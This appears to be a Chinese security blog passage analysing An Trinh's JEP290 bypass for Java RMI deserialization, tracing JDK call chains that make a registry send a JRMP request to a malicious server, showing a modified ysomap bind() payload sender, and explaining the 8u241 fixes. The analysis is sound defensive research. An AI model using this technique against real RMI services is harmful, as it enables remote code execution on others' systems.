<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17i6p8nkj31tt0spqih.jpg" alt="另一种绕过JEP290-1.png"></p>
<p>从UnicastRemoteObject的readObject入口开始<code>java.rmi.server.UnicastRemoteObject#readObject</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    reexport();<span class="comment">//这里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>java.rmi.server.UnicastRemoteObject#reexport</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reexport</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (csf == <span class="keyword">null</span> &amp;&amp; ssf == <span class="keyword">null</span>) &#123;</span><br><span class="line">         exportObject((Remote) <span class="keyword">this</span>, port);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     	<span class="comment">//payload是填充了ssf的,这里</span></span><br><span class="line">         exportObject((Remote) <span class="keyword">this</span>, port, csf, ssf);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>之后的调用链很长我们直接跳到<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>这里是第二个关键处动态代理的特性，跳转到拦截器的invoke（这里的动态代理是不仅用到了接口转换的特性，用到了拦截的特性！惊了！激动！）</p>
<p><code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ServerSocket <span class="title">newServerSocket</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.VERBOSE, <span class="string">"creating server socket on "</span> + <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object var1 = <span class="keyword">this</span>.ssf;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        var1 = chooseFactory();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//var1就是我们的payload中构建的ssf.调用他的createServerSocket</span></span><br><span class="line">    <span class="comment">//会根据动态代理进入RemoteObjectInvocationHandler#invoke</span></span><br><span class="line">    ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(<span class="keyword">this</span>.listenPort);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.listenPort == <span class="number">0</span>) &#123;</span><br><span class="line">        setDefaultPort(var2.getLocalPort(), <span class="keyword">this</span>.csf, <span class="keyword">this</span>.ssf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>java.rmi.server.RemoteObjectInvocationHandler#invoke</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">//method是java.rmi.server.RMIServerSocketFactory的createServerSocket方法</span></span><br><span class="line">		<span class="comment">//....</span></span><br><span class="line">		<span class="comment">//这边都不满足</span></span><br><span class="line">        <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"finalize"</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            !allowFinalizeInvocation) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// ignore</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        	<span class="comment">//进入此处</span></span><br><span class="line">            <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Method method,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Object[] args)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                    <span class="string">"proxy not Remote instance"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">//我们payload把RemoteObjectInvocationHandler的ref写成了JRMP恶意服务器地址</span></span><br><span class="line">          <span class="comment">//这里开始了触发JRMP请求</span></span><br><span class="line">            <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                              getMethodHash(method));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br></pre></td></tr></table></figure>
<p>令人激动的<code>sun.rmi.server.UnicastRef#invoke</code>我们之前JRMP触发就是在这里触发的，但是之前是<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>虽然接口是不一样，但是做的事情差不多</p>
<p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Remote var1, Method var2, Object[] var3, <span class="keyword">long</span> var4)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      	<span class="comment">//省略部分代码...  </span></span><br><span class="line">    	<span class="comment">//从ref中获取连接</span></span><br><span class="line">    	Connection var6 = <span class="keyword">this</span>.ref.getChannel().newConnection();</span><br><span class="line">        StreamRemoteCall var7 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> var8 = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">boolean</span> var9 = <span class="keyword">false</span>;</span><br><span class="line">        Object var13;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                clientRefLog.log(Log.VERBOSE, <span class="string">"opnum = "</span> + var4);</span><br><span class="line">            &#125;</span><br><span class="line">		   <span class="comment">//********对ref发起JRMP请求**********</span></span><br><span class="line">            var7 = <span class="keyword">new</span> StreamRemoteCall(var6, <span class="keyword">this</span>.ref.getObjID(), -<span class="number">1</span>, var4);</span><br><span class="line">		   <span class="comment">//处理结果</span></span><br><span class="line">            Object var11;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectOutput var10 = var7.getOutputStream();</span><br><span class="line">                <span class="keyword">this</span>.marshalCustomCallData(var10);</span><br><span class="line">                var11 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> var12 = <span class="number">0</span>; var12 &lt; ((Object[])var11).length; ++var12) &#123;</span><br><span class="line">                    marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var39) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF, <span class="string">"IOException marshalling arguments: "</span>, var39);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var39);</span><br><span class="line">            &#125;</span><br><span class="line">		   <span class="comment">//*******JRMP服务端返回信息，反序列化触发处*******</span></span><br><span class="line">            var7.executeCall();</span><br></pre></td></tr></table></figure>
<p>JRMP请求已经发起了并且返回包也收到了，接下来的报错信息饭反序列化触发点就一样了</p>
<p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//..省略</span></span><br><span class="line">  <span class="keyword">switch</span>(var1) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Object var14;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//***这里触发反序列化JRMP服务端的返回的恶意对象***</span></span><br><span class="line">                var14 = <span class="keyword">this</span>.in.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br></pre></td></tr></table></figure>
<p>总结三个关键点：</p>
<ol>
<li>利用readobject的复写特性执行UnicastRemoteObject的readObject</li>
<li>利用动态代理的拦截执行invoke的特性，在UnicastRemoteObject#readObject的调用链中执行<code>proxy对象.createServerSocket</code>跳到了RemoteObjectInvocationHandler的invoke方法</li>
<li>RemoteObjectInvocationHandler的invoke方法可以根据内置的ref向外发起JRMP连接，再反序列化返回结果</li>
</ol>
<p>妙呀妙呀，动态代理终于再也不是工具人了。</p>
<p>妙啊妙啊，大佬就是大佬。</p>
<h3 id="复现—绕过8u231"><a href="#复现—绕过8u231" class="headerlink" title="复现—绕过8u231"></a>复现—绕过8u231</h3><p>利用ysomap的RMIConnectWithUnicastRemoteObject模块就可以惹。（也可以在源码的ysomap.core.exploit.rmi.NamingTest#lookup测试模块进行测试）</p>
<p>但是我们会发现……..刚才用之前的<strong>readobject的递归-填装-触发</strong>绕过方法在8u231还会被完美拦截，这次却可以了…..</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17ivy1q8j320m11dgxv.jpg" alt="另一种绕过JEP290-8u231成功png.png"></p>
<p>激动的搓手手！An Trinh NB！鸡肋个锤子鸡肋，这个绕过方式绕过了231u11版本！！！</p>
<p>我们来看看是如何做到的！同样从231u11的两处修复出发：</p>
<ol>
<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref<br>看上面的触发流程，你就知道为啥绕过了。<br>这项修复针对的是<strong>readobject的递归-填装-触发模式</strong>JRMP请求发起，在readobject中利用复写的Gadagets完全不受这个ref清除操作的影响。完美！</li>
<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单<br>这是针对在JRMP触发链获取到JRMP服务器之后的一个黑名单拦截修复。<br>但是看看上面利用成功调用栈，会发现这个调用栈压根不走DGC层的dirty，而是直接调用了ref的invoke，相当于绕过了之前触发链的黑名单拦截。完美！</li>
</ol>
<p>那么为什么这个Gadgets能绕过231u11的修复，我们也就清楚了。也不知道是无意为之还是刻意所为，这种每个地方都恰到好处的美感…….嘶…….</p>
<h3 id="8u241的修复第一处"><a href="#8u241的修复第一处" class="headerlink" title="8u241的修复第一处"></a>8u241的修复第一处</h3><p>在8u241版本，针对这个绕过链进行了修复：修复说明在<a href="https://www.oracle.com/technetwork/java/javase/8u241-relnotes-5813177.html#JDK-8230967" target="_blank" rel="noopener">Oracle官网也有说明</a></p>
<p>重点就是把应该是String的地方从本来的<code>(String)var9.readobject()</code>改成了<br><code>SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);</code>前者是可以反序列化Object的，但是后者就完全不接受反序列化Object。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17j29sk8j317m0d6wfk.jpg" alt="另一种绕过JEP290-8U241修复.png"></p>
<p>为什么不接受反序列化Object呢，调试跟进看readString里面：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">readString</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	<span class="keyword">return</span> (String) readObject(String.class);<span class="comment">//进入此处</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException cnf) &#123;</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(cnf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code>，这个readString进来的接口跟我们平时调用readObject不一样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//平时调用的</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> readObject(Object.class);<span class="comment">//我们平常会进入此处</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>readObject(Object.class);</code>与<code>readObject(String.class);</code></p>
<p>在<code>java.io.ObjectInputStream#readObject(type)</code>会进行一些无关竟要的操作然后传递type<br>进入<code>java.io.ObjectInputStream#readObject0(type)</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//8u241时这里，type传入String</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readObject0</span><span class="params">(Class&lt;?&gt; type, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  	<span class="comment">//...</span></span><br><span class="line">    <span class="keyword">case</span> TC_OBJECT:<span class="comment">//我们输入的payload对象是一个Object</span></span><br><span class="line">        <span class="keyword">if</span> (type == String.class) &#123;</span><br><span class="line">            <span class="comment">//8u241 type=String 直接在此处报错不进行反序列化了</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException(<span class="string">"Cannot cast an object to java.lang.String"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">//之前的版本都是传入type=Object于是正常反序列化</span></span><br><span class="line">        <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以在8u241中，如果参数应该是String的反序列化点就直接拒绝了Object的反序列化，杜绝了我们的上面的Gadgets。</p>
<h3 id="bind加上IP限制枷锁还可以用？"><a href="#bind加上IP限制枷锁还可以用？" class="headerlink" title="bind加上IP限制枷锁还可以用？"></a>bind加上IP限制枷锁还可以用？</h3><p>那么是不是所有地方都做了这种限制呢？其实也不是，重新看回<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"> <span class="comment">//bind操作，权限检查</span></span><br><span class="line">    RegistryImpl.checkAccess(<span class="string">"Registry.bind"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       var10 = (ObjectInputStream)var7.getInputStream();</span><br><span class="line">       var8 = SharedSecrets.getJavaObjectInputStreamReadString().readString(var10);</span><br><span class="line">       var81 = (Remote)var10.readObject();<span class="comment">//这里还是正常的readObject</span></span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException | ClassCastException var78) &#123;</span><br><span class="line">       var7.discardPendingRefs();</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var78);</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">       var7.releaseInputStream();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>发现bind中还是有可以反序列化的点的。但是这又回到了原来的问题：</p>
<p>bind由于<code>RegistryImpl.checkAccess(&quot;Registry.bind&quot;);</code>这句话在8u141之后有注册端地址校验限制，我们之前也是想要绕过8u141的限制所以转战lookup。（同时rebind也一样）</p>
<p>那么我们可不可以接受IP限制，假设场景：RMI服务器与RMI注册端分离，我们获取了一台对方内网的RMI服务器然后去利用RMI反序列化攻击RMI注册端，是否在8u241的版本下可行呢？</p>
<ol>
<li>使用bind通讯</li>
<li>使用An Trinh的UnicastRemoteObject链</li>
<li>由于使用到UnicastRemoteObject对象这就需要修改bind的底层协议使UnicastRemoteObject对象内容不会被覆盖，这就需要修改bind通讯。（在 绕过序列化过程中的替换使所有类均可用于攻击 一节中提到）</li>
</ol>
<p>选取ysomap作为poc构造工具，参考lookup重构一个bind协议：</p>
<p><code>ysomap.core.exploit.rmi.component.Naming</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">bind</span><span class="params">(Registry registry,String name, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//..一致</span></span><br><span class="line">        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">0</span>, interfaceHash);<span class="comment">//修改为0，bind接口编号</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                <span class="comment">//反射修改enableReplace，处理覆盖问题</span></span><br><span class="line">                ReflectionHelper.setFieldValue(out, <span class="string">"enableReplace"</span>, <span class="keyword">false</span>);</span><br><span class="line">                out.writeObject(name);<span class="comment">//随便写</span></span><br><span class="line">                out.writeObject(obj); <span class="comment">// payload</span></span><br><span class="line">            <span class="comment">//..</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然后修改<code>ysomap.core.exploit.rmi.RMIRegistryExploit</code>里面<code>Naming.lookup(registry, remote);</code>为<code>Naming.bind(registry, name,remote);</code></p>
<p>尝试攻击8u241</p>
<p>(失败的图找不到了，反正就是没有命令执行啦)</p>
<p>华丽失败</p>
<h3 id="8u241的修复第二处"><a href="#8u241的修复第二处" class="headerlink" title="8u241的修复第二处"></a>8u241的修复第二处</h3><p>好吧，肯定是哪里有问题，0day就这样没了（狗头）。</p>
<p>问题在于8u241还修复了调用栈中的<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>方法。（复用调用栈的图，第三行）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jj8ahcj31tt0spqih.jpg" alt="另一种绕过JEP290-1.png"></p>
<p>对比下8u231和8u241：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jqcprij32bc0j377m.jpg" alt="另一种绕过JEP290-bind修复第二处.png"></p>
<p>添加了一处针对传入method的验证。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jwlsnjj31hi11agqx.jpg" alt="另一种绕过JEP290-bind修复第二处-调试.png"></p>
<p>这个的method是从<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(<span class="keyword">this</span>.listenPort);</span><br></pre></td></tr></table></figure>
<p>由于动态代理特性过来的，method就是createServerSocket这个方法，然而它理所当然不是一个remote接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIServerSocketFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServerSocket <span class="title">createServerSocket</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以即使我们用bind绕过第一个修复，还是被第二个修复处给干掉了。</p>
<p>假如要硬趟着修复点过去，必须在UnicastRemoteObject的invoke的调用栈中，找到一个可控的同时方法还是remote的地方，再把它接到RemoteObjectInvocationHandler的invoke方法，从而满足这个修复点的验证。</p>
<p>太难，太难。</p>
<p>至此8u241之后针对RMI服务的反序列化攻击，就GG了……</p>
<h2 id="小结-amp-总结"><a href="#小结-amp-总结" class="headerlink" title="小结&amp;总结"></a>小结&amp;总结</h2><p>针对利用JRMP反序列化绕过JEP290-bind：</p>
<ol>
<li>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</li>
<li>指出了<a href="[http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/](http://www.codersec.net/2018/09/一次攻击内网rmi服务的深思/">bsmali4师傅的文</a>)中关于UnicastRemoteObject类不能用是因为ref属性为transient的错误。（在动态代理-RemoteObjectInvocationHandler一节中）</li>
<li>在利用JRMP反序列化绕过JEP290的Ysoserial的实现中，利用RemoteObjectInvocationHandler仍然使用动态代理是非必要的。</li>
<li>在利用JRMP反序列化绕过JEP290的Ysoserial的实现，利用服务端不存在的自定义的InvocationHandler是可行的。</li>
</ol>
<p>针对利用JRMP反序列化绕过JEP290-lookup：</p>
<ol>
<li>利用lookup，绕过了8u141的限制，从而真正完成了JEP290的版本绕过</li>
</ol>
<p>来自An Trinh的另一种绕过JEP290的思路：</p>
<ol>
<li>利用RemoteObjectInvocationHandler完全不同的触发点，绕过了8u231的修复，被8u241阻止了为所欲为。</li>
</ol>
<p><strong>最后总结</strong>：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="总结图.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>认真看了很多老哥的博客，先给全员点个赞：</p>
<p>写到一半的时候发现总体文章框架是跟<a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">attacking-java-rmi-services-after-jep-290</a>雷同的，原来我想写的已经有人做过了，想想当作这篇文章详细版本好了，但是到后面发现还是发现了一些别人没有记录下来或没有细说的东西，比如自定义类，lookup绕过等。</p>
<p>在文章后半部分还大量参考了<a href="https://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/" target="_blank" rel="noopener">0kami的研究结果</a>和<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">An Trinh的绕过方式</a>，膜拜。</p>
<p>此外<a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">paper这篇</a>在第三点RMI的动态加载、第四点JNDI注入都花了比较多的笔墨，但是在对于第二点RMI服务端的反序列化攻击中，讨论了<strong>RMI客户端–攻击–&gt;RMI服务端</strong>的情况，同时也是要求RMI服务端必须提供一个输入参数为Object的方法，客户端调用这个方法传入Object的payload。此外将RMI<strong>客户端–通过lookup攻击–&gt;RMI注册端</strong>的情况点了一下（也就是我忽略了的注册端）。</p>
<p><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">threedr3am第一篇</a>讲述了JNDI注入、<strong>RMI服务端—通过bind攻击–RMI注册端</strong>，导致RMI注册端被RCE（此处他文章中的标题与讲述内容不符，应该是标题写错了），JRMP的客户端与服务端攻击。</p>
<p><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">threedr3am第二篇</a>细节分析了<strong>RMI客户端—通过lookup攻击–RMI注册端</strong>（以及注册端回打客户端）、<strong>RMI服务端—通过bind攻击–RMI注册端</strong>，点了一下<strong>RMI客户端—通过替换参数攻击–RMI服务端</strong>，重新分析了下JNDI注入关于Reference远程对象的细节（这里可能会出现误解，攻击场景是我们控制一个RMI服务端，我们要让RMI客户端（受害者）主动来<code>new InitialContext().lookup</code>我们，这个lookup与RMI客户端查询RMI注册端的lookup不一样【前者的lookup=后者的lookup查询+会触发漏洞的解析过程】，最后导致客户端被RCE）、打注册端时在8u121之后的JDK存在黑名单，出现Yso-RMIClient、再是JNDI注入绕过。</p>
<p><a href="https://www.anquanke.com/post/id/200860" target="_blank" rel="noopener">afanti的Bypass JEP290攻击rmi</a>与<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg" target="_blank" rel="noopener">0c0c0f的RMI漏洞的另一种利用方式</a>实际都是讲述了客户端攻击服务端解析参数时绕过Object的方法</p>
<p><a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a></p>
<p>译文：<a href="https://nosec.org/home/detail/2541.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2541.html</a></p>
